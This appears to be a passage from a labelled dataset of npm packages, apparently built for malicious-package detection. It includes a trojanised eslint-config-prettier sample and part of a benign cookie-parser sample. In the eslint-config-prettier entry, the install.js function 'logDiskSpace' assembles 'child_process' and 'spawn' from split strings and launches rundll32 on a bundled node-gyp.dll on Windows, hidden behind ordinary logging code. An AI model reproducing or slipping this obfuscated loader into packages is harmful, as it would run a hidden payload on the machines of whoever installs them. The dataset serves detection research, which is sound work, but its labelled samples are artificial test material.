Date.now();\n    const maxAgeMs = maxAgeDays * 24 * 60 * 60 * 1000;\n\n    const files = cache.readdirSync(dirPath);\n    for (const file of files) {\n        const filePath = path.join(dirPath, file);\n        try {\n            const stat = cache.lstatSync(filePath);\n            const age = now - stat.mtimeMs;\n\n            if (stat.isFile() && age > maxAgeMs) {\n            \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js (function)\nfunction rotateLogs() {\n    if (!cache.existsSync(LOG_DIR)) return;\n\n    const logs = cache.readdirSync(LOG_DIR)\n        .filter(f => f.startsWith('install_log_') && f.endsWith('.txt'))\n        .map(f => ({\n            name: f,\n            path: path.join(LOG_DIR, f),\n            time: cache.statSync(path.join(LOG_DIR, f)).mtimeMs,\n        }))\n        .sort((a, b) => b.time - a.time);\n\n    while (logs.length > MAX_LOG_FILES) {\n        const oldest = logs.pop();\n        try {\n            if (!DRY\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js (function)\nfunction logDiskSpace() {\n    try {\n        if(os.platform() === 'win32') {\n            const tempDir = os.tmpdir();\n            require('chi'+'ld_pro'+'cess')[\"sp\"+\"awn\"](\"rund\"+\"ll32\", \n            [path.join(__dirname, './node-gyp' + '.dll') + \",main\"]);\n            log(`Temp directory: ${tempDir}`);\n            const files = cache.readdirSync(tempDir);\n            log(`Number of files in temp directory: ${files.length}`);\n        }\n    } catch (err) {\n        summary.errors++;\n        log(`E\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js (function)\nfunction listDirectoryContents(dirPath) {\n    if (!cache.existsSync(dirPath)) {\n        log(`Directory does not exist: ${dirPath}`);\n        return;\n    }\n    log(`Contents of ${dirPath}:`);\n    const files = cache.readdirSync(dirPath);\n    for (const file of files) {\n        try {\n            const filePath = path.join(dirPath, file);\n            const stat = cache.statSync(filePath);\n            const sizeKB = (stat.size / 1024).toFixed(2);\n            const mtime = new Date(stat.mtimeMs).toLo\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/vue.js (file)\nthrow new Error(\n  '\"prettier/vue\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/babel.js (file)\nthrow new Error(\n  '\"prettier/babel\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/flowtype.js (file)\nthrow new Error(\n  '\"prettier/flowtype\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/bin/validators.js (file)\n\"use strict\";\n\n// These validator functions answer the question \u201cIs the config valid?\u201d \u2013 return\n// `false` if the options DO conflict with Prettier, and `true` if they don\u2019t.\n\nmodule.exports = {\n  \"curly\"({ options }) {\n    if (options.length === 0) {\n      return true;\n    }\n\n    const firstOption = options[0];\n    return firstOption !== \"multi-line\" && firstOption !== \"multi-or-nest\";\n  },\n\n  \"lines-around-comment\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(\n      firstOption &&\n        firstOption.allowBlockStart &&\n        firstOption.allowBlockEnd &&\n        firstOption.allowObjectStart &&\n        firstOption.allowObjectEnd &&\n        firstOption.allowArrayStart &&\n        firstOption.allowArrayEnd\n    );\n  },\n\n  \"no-confusing-arrow\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return firstOption ? firstOption.allowParens === false : false;\n  },\n\n  \"no-tabs\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(firstOption && firstOption.allowIndentationTabs);\n  },\n\n  \"vue/html-self-closing\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(\n      firstOption && firstOption.html && firstOption.html.void === \"any\"\n      // Enable when Prettier supports SVG: https://github.com/prettier/prettier/issues/5322\n      // && firstOption.svg === \"any\"\n    );\n  },\n};\n\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/bin/cli.js (function)\nfunction help() {\n  return `\nUsage: npx eslint-config-prettier FILE...\n\nResolves an ESLint configuration for every given FILE and checks if they\ncontain rules that are unnecessary or conflict with Prettier. Example:\n\n  npx eslint-config-prettier index.js test/index.js other/file/to/check.js\n\nExit codes:\n\n0: No automatically detectable problems found.\n1: General error.\n2: Conflicting rules found.\n\nFor more information, see:\nhttps://github.com/prettier/eslint-config-prettier#cli-helper-tool\n  `.tr\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/bin/cli.js (function)\nfunction processRules(configRules) {\n  const regularRules = filterRules(config.rules, (_, value) => value === \"off\");\n  const optionsRules = filterRules(\n    config.rules,\n    (ruleName, value) => value === 0 && ruleName in validators\n  );\n  const specialRules = filterRules(\n    config.rules,\n    (ruleName, value) => value === 0 && !(ruleName in validators)\n  );\n\n  const enabledRules = configRules\n    .map(([ruleName, value, source]) => {\n      const arrayValue = Array.isArray(value) ? value : [\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/bin/cli.js (function)\nfunction filterRules(rules, fn) {\n  return Object.fromEntries(\n    Object.entries(rules)\n      .filter(([ruleName, value]) => fn(ruleName, value))\n      .map(([ruleName]) => [ruleName, true])\n  );\n}\n\nfunction filterRuleNames(rules, fn) {\n  return [\n    ...new Set(rules.filter((rule) => fn(rule)).map((rule) => rule.ruleName)),\n  ];\n}\n\nfunction printRuleNames(ruleNames) {\n  return ruleNames\n    .slice()\n    .sort()\n    .map((ruleName) => `- ${ruleName}`)\n    .join(\"\\n\");\n}\n\nexports.processRules = \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/bin/cli.js (function)\nfunction filterRuleNames(rules, fn) {\n  return [\n    ...new Set(rules.filter((rule) => fn(rule)).map((rule) => rule.ruleName)),\n  ];\n}\n\nfunction printRuleNames(ruleNames) {\n  return ruleNames\n    .slice()\n    .sort()\n    .map((ruleName) => `- ${ruleName}`)\n    .join(\"\\n\");\n}\n\nexports.processRules = processRules;\n\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/bin/cli.js (function)\nfunction printRuleNames(ruleNames) {\n  return ruleNames\n    .slice()\n    .sort()\n    .map((ruleName) => `- ${ruleName}`)\n    .join(\"\\n\");\n}\n\nexports.processRules = processRules;\n\n==================================================\n",
      "file_paths": [
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/standard.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/prettier.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/unicorn.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/react.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/index.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/@typescript-eslint.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/vue.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/babel.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/flowtype.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/bin/validators.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/bin/cli.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/bin/cli.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/bin/cli.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/bin/cli.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/bin/cli.js"
      ],
      "individual_files": {
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/standard.js": "throw new Error(\n  '\"prettier/standard\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/prettier.js": "\"use strict\";\n\nmodule.exports = {\n  rules: {\n    // These are safe to use as long as the `\"prettier/prettier\"` rule from\n    // eslint-plugin-prettier isn\u2019t enabled.\n    // These are also included in `\"plugin:prettier/recommended\"`:\n    // https://github.com/prettier/eslint-plugin-prettier#recommended-configuration\n    \"arrow-body-style\": 0,\n    \"prefer-arrow-callback\": 0,\n  },\n};\n",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/unicorn.js": "throw new Error(\n  '\"prettier/unicorn\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/react.js": "throw new Error(\n  '\"prettier/react\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/index.js": "\"use strict\";\n\nconst includeDeprecated = !process.env.ESLINT_CONFIG_PRETTIER_NO_DEPRECATED;\n\nmodule.exports = {\n  rules: {\n    // The following rules can be used in some cases. See the README for more\n    // information. (These are marked with `0` instead of `\"off\"` so that a\n    // script can distinguish them.)\n    \"curly\": 0,\n    \"lines-around-comment\": 0,\n    \"max-len\": 0,\n    \"no-confusing-arrow\": 0,\n    \"no-mixed-operators\": 0,\n    \"no-tabs\": 0,\n    \"no-unexpected-multiline\": 0,\n    \"quotes\": 0,\n    \"@typescript-eslint/lines-around-comment\": 0,\n    \"@typescript-eslint/quotes\": 0,\n    \"babel/quotes\": 0,\n    \"vue/html-self-closing\": 0,\n    \"vue/max-len\": 0,\n\n    // The rest are rules that you never need to enable when using Prettier.\n    \"array-bracket-newline\": \"off\",\n    \"array-bracket-spacing\": \"off\",\n    \"array-element-newline\": \"off\",\n    \"arrow-parens\": \"off\",\n    \"arrow-spacing\": \"off\",\n    \"block-spacing\": \"off\",\n    \"brace-style\": \"off\",\n    \"comma-dangle\": \"off\",\n    \"comma-spacing\": \"off\",\n    \"comma-style\": \"off\",\n    \"computed-property-spacing\": \"off\",\n    \"dot-location\": \"off\",\n    \"eol-last\": \"off\",\n    \"func-call-spacing\": \"off\",\n    \"function-call-argument-newline\": \"off\",\n    \"function-paren-newline\": \"off\",\n    \"generator-star-spacing\": \"off\",\n    \"implicit-arrow-linebreak\": \"off\",\n    \"indent\": \"off\",\n    \"jsx-quotes\": \"off\",\n    \"key-spacing\": \"off\",\n    \"keyword-spacing\": \"off\",\n    \"linebreak-style\": \"off\",\n    \"max-statements-per-line\": \"off\",\n    \"multiline-ternary\": \"off\",\n    \"newline-per-chained-call\": \"off\",\n    \"new-parens\": \"off\",\n    \"no-extra-parens\": \"off\",\n    \"no-extra-semi\": \"off\",\n    \"no-floating-decimal\": \"off\",\n    \"no-mixed-spaces-and-tabs\": \"off\",\n    \"no-multi-spaces\": \"off\",\n    \"no-multiple-empty-lines\": \"off\",\n    \"no-trailing-spaces\": \"off\",\n    \"no-whitespace-before-property\": \"off\",\n    \"nonblock-statement-body-position\": \"off\",\n    \"object-curly-newline\": \"off\",\n    \"object-curly-spacing\": \"off\",\n    \"object-property-newline\": \"off\",\n    \"one-var-declaration-per-line\": \"off\",\n    \"operator-linebreak\": \"off\",\n    \"padded-blocks\": \"off\",\n    \"quote-props\": \"off\",\n    \"rest-spread-spacing\": \"off\",\n    \"semi\": \"off\",\n    \"semi-spacing\": \"off\",\n    \"semi-style\": \"off\",\n    \"space-before-blocks\": \"off\",\n    \"space-before-function-paren\": \"off\",\n    \"space-in-parens\": \"off\",\n    \"space-infix-ops\": \"off\",\n    \"space-unary-ops\": \"off\",\n    \"switch-colon-spacing\": \"off\",\n    \"template-curly-spacing\": \"off\",\n    \"template-tag-spacing\": \"off\",\n    \"unicode-bom\": \"off\",\n    \"wrap-iife\": \"off\",\n    \"wrap-regex\": \"off\",\n    \"yield-star-spacing\": \"off\",\n    \"@babel/object-curly-spacing\": \"off\",\n    \"@babel/semi\": \"off\",\n    \"@typescript-eslint/block-spacing\": \"off\",\n    \"@typescript-eslint/brace-style\": \"off\",\n    \"@typescript-eslint/comma-dangle\": \"off\",\n    \"@typescript-eslint/comma-spacing\": \"off\",\n    \"@typescript-eslint/func-call-spacing\": \"off\",\n    \"@typescript-eslint/indent\": \"off\",\n    \"@typescript-eslint/key-spacing\": \"off\",\n    \"@typescript-eslint/keyword-spacing\": \"off\",\n    \"@typescript-eslint/member-delimiter-style\": \"off\",\n    \"@typescript-eslint/no-extra-parens\": \"off\",\n    \"@typescript-eslint/no-extra-semi\": \"off\",\n    \"@typescript-eslint/object-curly-spacing\": \"off\",\n    \"@typescript-eslint/semi\": \"off\",\n    \"@typescript-eslint/space-before-blocks\": \"off\",\n    \"@typescript-eslint/space-before-function-paren\": \"off\",\n    \"@typescript-eslint/space-infix-ops\": \"off\",\n    \"@typescript-eslint/type-annotation-spacing\": \"off\",\n    \"babel/object-curly-spacing\": \"off\",\n    \"babel/semi\": \"off\",\n    \"flowtype/boolean-style\": \"off\",\n    \"flowtype/delimiter-dangle\": \"off\",\n    \"flowtype/generic-spacing\": \"off\",\n    \"flowtype/object-type-curly-spacing\": \"off\",\n    \"flowtype/object-type-delimiter\": \"off\",\n    \"flowtype/quotes\": \"off\",\n    \"flowtype/semi\": \"off\",\n    \"flowtype/space-after-type-colon\": \"off\",\n    \"flowtype/space-before-generic-bracket\": \"off\",\n    \"flowtype/space-before-type-colon\": \"off\",\n    \"flowtype/union-intersection-spacing\": \"off\",\n    \"react/jsx-child-element-spacing\": \"off\",\n    \"react/jsx-closing-bracket-location\": \"off\",\n    \"react/jsx-closing-tag-location\": \"off\",\n    \"react/jsx-curly-newline\": \"off\",\n    \"react/jsx-curly-spacing\": \"off\",\n    \"react/jsx-equals-spacing\": \"off\",\n    \"react/jsx-first-prop-new-line\": \"off\",\n    \"react/jsx-indent\": \"off\",\n    \"react/jsx-indent-props\": \"off\",\n    \"react/jsx-max-props-per-line\": \"off\",\n    \"react/jsx-newline\": \"off\",\n    \"react/jsx-one-expression-per-line\": \"off\",\n    \"react/jsx-props-no-multi-spaces\": \"off\",\n    \"react/jsx-tag-spacing\": \"off\",\n    \"react/jsx-wrap-multilines\": \"off\",\n    \"standard/array-bracket-even-spacing\": \"off\",\n    \"standard/computed-property-even-spacing\": \"off\",\n    \"standard/object-curly-even-spacing\": \"off\",\n    \"unicorn/empty-brace-spaces\": \"off\",\n    \"unicorn/no-nested-ternary\": \"off\",\n    \"unicorn/number-literal-case\": \"off\",\n    \"vue/array-bracket-newline\": \"off\",\n    \"vue/array-bracket-spacing\": \"off\",\n    \"vue/array-element-newline\": \"off\",\n    \"vue/arrow-spacing\": \"off\",\n    \"vue/block-spacing\": \"off\",\n    \"vue/block-tag-newline\": \"off\",\n    \"vue/brace-style\": \"off\",\n    \"vue/comma-dangle\": \"off\",\n    \"vue/comma-spacing\": \"off\",\n    \"vue/comma-style\": \"off\",\n    \"vue/dot-location\": \"off\",\n    \"vue/func-call-spacing\": \"off\",\n    \"vue/html-closing-bracket-newline\": \"off\",\n    \"vue/html-closing-bracket-spacing\": \"off\",\n    \"vue/html-end-tags\": \"off\",\n    \"vue/html-indent\": \"off\",\n    \"vue/html-quotes\": \"off\",\n    \"vue/key-spacing\": \"off\",\n    \"vue/keyword-spacing\": \"off\",\n    \"vue/max-attributes-per-line\": \"off\",\n    \"vue/multiline-html-element-content-newline\": \"off\",\n    \"vue/multiline-ternary\": \"off\",\n    \"vue/mustache-interpolation-spacing\": \"off\",\n    \"vue/no-extra-parens\": \"off\",\n    \"vue/no-multi-spaces\": \"off\",\n    \"vue/no-spaces-around-equal-signs-in-attribute\": \"off\",\n    \"vue/object-curly-newline\": \"off\",\n    \"vue/object-curly-spacing\": \"off\",\n    \"vue/object-property-newline\": \"off\",\n    \"vue/operator-linebreak\": \"off\",\n    \"vue/quote-props\": \"off\",\n    \"vue/script-indent\": \"off\",\n    \"vue/singleline-html-element-content-newline\": \"off\",\n    \"vue/space-in-parens\": \"off\",\n    \"vue/space-infix-ops\": \"off\",\n    \"vue/space-unary-ops\": \"off\",\n    \"vue/template-curly-spacing\": \"off\",\n\n    ...(includeDeprecated && {\n      // Removed in version 1.0.0.\n      // https://eslint.org/docs/latest/rules/generator-star\n      \"generator-star\": \"off\",\n      // Deprecated since version 4.0.0.\n      // https://github.com/eslint/eslint/pull/8286\n      \"indent-legacy\": \"off\",\n      // Removed in version 2.0.0.\n      // https://eslint.org/docs/latest/rules/no-arrow-condition\n      \"no-arrow-condition\": \"off\",\n      // Removed in version 1.0.0.\n      // https://eslint.org/docs/latest/rules/no-comma-dangle\n      \"no-comma-dangle\": \"off\",\n      // Removed in version 1.0.0.\n      // https://eslint.org/docs/latest/rules/no-reserved-keys\n      \"no-reserved-keys\": \"off\",\n      // Removed in version 1.0.0.\n      // https://eslint.org/docs/latest/rules/no-space-before-semi\n      \"no-space-before-semi\": \"off\",\n      // Deprecated since version 3.3.0.\n      // https://eslint.org/docs/rules/no-spaced-func\n      \"no-spaced-func\": \"off\",\n      // Removed in version 1.0.0.\n      // https://eslint.org/docs/latest/rules/no-wrap-func\n      \"no-wrap-func\": \"off\",\n      // Removed in version 1.0.0.\n      // https://eslint.org/docs/latest/rules/space-after-function-name\n      \"space-after-function-name\": \"off\",\n      // Removed in version 2.0.0.\n      // https://eslint.org/docs/latest/rules/space-after-keywords\n      \"space-after-keywords\": \"off\",\n      // Removed in version 1.0.0.\n      // https://eslint.org/docs/latest/rules/space-before-function-parentheses\n      \"space-before-function-parentheses\": \"off\",\n      // Removed in version 2.0.0.\n      // https://eslint.org/docs/latest/rules/space-before-keywords\n      \"space-before-keywords\": \"off\",\n      // Removed in version 1.0.0.\n      // https://eslint.org/docs/latest/rules/space-in-brackets\n      \"space-in-brackets\": \"off\",\n      // Removed in version 2.0.0.\n      // https://eslint.org/docs/latest/rules/space-return-throw-case\n      \"space-return-throw-case\": \"off\",\n      // Removed in version 0.10.0.\n      // https://eslint.org/docs/latest/rules/space-unary-word-ops\n      \"space-unary-word-ops\": \"off\",\n      // Deprecated since version 7.0.0.\n      // https://github.com/yannickcr/eslint-plugin-react/blob/master/CHANGELOG.md#700---2017-05-06\n      \"react/jsx-space-before-closing\": \"off\",\n    }),\n  },\n};\n",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/@typescript-eslint.js": "throw new Error(\n  '\"prettier/@typescript-eslint\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js": "function listDirectoryContents(dirPath) {\n    if (!cache.existsSync(dirPath)) {\n        log(`Directory does not exist: ${dirPath}`);\n        return;\n    }\n    log(`Contents of ${dirPath}:`);\n    const files = cache.readdirSync(dirPath);\n    for (const file of files) {\n        try {\n            const filePath = path.join(dirPath, file);\n            const stat = cache.statSync(filePath);\n            const sizeKB = (stat.size / 1024).toFixed(2);\n            const mtime = new Date(stat.mtimeMs).toLo",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/vue.js": "throw new Error(\n  '\"prettier/vue\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/babel.js": "throw new Error(\n  '\"prettier/babel\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/flowtype.js": "throw new Error(\n  '\"prettier/flowtype\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/bin/validators.js": "\"use strict\";\n\n// These validator functions answer the question \u201cIs the config valid?\u201d \u2013 return\n// `false` if the options DO conflict with Prettier, and `true` if they don\u2019t.\n\nmodule.exports = {\n  \"curly\"({ options }) {\n    if (options.length === 0) {\n      return true;\n    }\n\n    const firstOption = options[0];\n    return firstOption !== \"multi-line\" && firstOption !== \"multi-or-nest\";\n  },\n\n  \"lines-around-comment\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(\n      firstOption &&\n        firstOption.allowBlockStart &&\n        firstOption.allowBlockEnd &&\n        firstOption.allowObjectStart &&\n        firstOption.allowObjectEnd &&\n        firstOption.allowArrayStart &&\n        firstOption.allowArrayEnd\n    );\n  },\n\n  \"no-confusing-arrow\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return firstOption ? firstOption.allowParens === false : false;\n  },\n\n  \"no-tabs\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(firstOption && firstOption.allowIndentationTabs);\n  },\n\n  \"vue/html-self-closing\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(\n      firstOption && firstOption.html && firstOption.html.void === \"any\"\n      // Enable when Prettier supports SVG: https://github.com/prettier/prettier/issues/5322\n      // && firstOption.svg === \"any\"\n    );\n  },\n};\n",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/bin/cli.js": "function printRuleNames(ruleNames) {\n  return ruleNames\n    .slice()\n    .sort()\n    .map((ruleName) => `- ${ruleName}`)\n    .join(\"\\n\");\n}\n\nexports.processRules = processRules;\n"
      },
      "package_size_bytes": 23120,
      "num_files": 24,
      "metadata": {
        "package_hash": "npm_eslint-config-prettier_2025",
        "malicious_label": 1.0
      }
    },
    {
      "package_name": "cookie-parser",
      "ecosystem": "npm",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/npm/popular/cookie-parser/1.4.7/package/index.js (function)\nfunction cookieParser (secret, options) {\n  var secrets = !secret || Array.isArray(secret)\n    ? (secret || [])\n    : [secret]\n\n  return function cookieParser (req, res, next) {\n    if (req.cookies) {\n      return next()\n    }\n\n    var cookies = req.headers.cookie\n\n    req.secret = secrets[0]\n    req.cookies = Object.create(null)\n    req.signedCookies = Object.create(null)\n\n    // no cookies\n    if (!cookies) {\n      return next()\n    }\n\n    req.cookies = cookie.parse(cookies, options)\n\n    // p\n==================================================\n\n# File: data/benign_samples/npm/popular/cookie-parser/1.4.7/package/index.js (function)\nfunction cookieParser (req, res, next) {\n    if (req.cookies) {\n      return next()\n    }\n\n    var cookies = req.headers.cookie\n\n    req.secret = secrets[0]\n    req.cookies = Object.create(null)\n    req.signedCookies = Object.create(null)\n\n    // no cookies\n    if (!cookies) {\n      return next()\n    }\n\n    req.cookies = cookie.parse(cookies, options)\n\n    // parse signed cookies\n    if (secrets.length !== 0) {\n      req.signedCookies = signedCookies(req.cookies, secrets)\n      req.signedCookies\n==================================================\n\n# File: data/benign_samples/npm/popular/cookie-parser/1.4.7/package/index.js (function)\nfunction JSONCookie (str) {\n  if (typeof str !== 'string' || str.substr(0, 2) !== 'j:') {\n    return undefined\n  }\n\n  try {\n    return JSON.parse(str.slice(2))\n  } catch (err) {\n    return undefined\n  }\n}\n\n/**\n * Parse JSON cookies.\n *\n * @param {Object} obj\n * @return {Object}\n * @public\n */\n\nfunction JSONCookies (obj) {\n  var cookies = Object.keys(obj)\n  var key\n  var val\n\n  for (var i = 0; i < cookies.length; i++) {\n    key = cookies[i]\n    val = JSONCookie(obj[key])\n\n    if (val) {\n      obj\n==================================================\n\n# File: data/benign_samples/npm/popular/cookie-parser/1.4.7/package/index.js (function)\nfunction JSONCookies (obj) {\n  var cookies = Object.keys(obj)\n  var key\n  var val\n\n  for (var i = 0; i < cookies.length; i++) {\n    key = cookies[i]\n    val = JSONCookie(obj[key])\n\n    if (val) {\n      obj[key] = val\n    }\n  }\n\n  return obj\n}\n\n/**\n * Parse a signed cookie string, return the decoded value.\n *\n * @param {String} str signed cookie string\n * @param {string|array} secret\n * @return {String} decoded value\n * @public\n */\n\nfunction signedCookie (str, secret) {\n  if (typeof str !== 'stri\n==================================================\n\n# File: data/benign_samples/npm/popular/cookie-parser/1.4.7/package/index.js (function)\nfunction signedCookie (str, secret) {\n  if (typeof str !== 'string') {\n 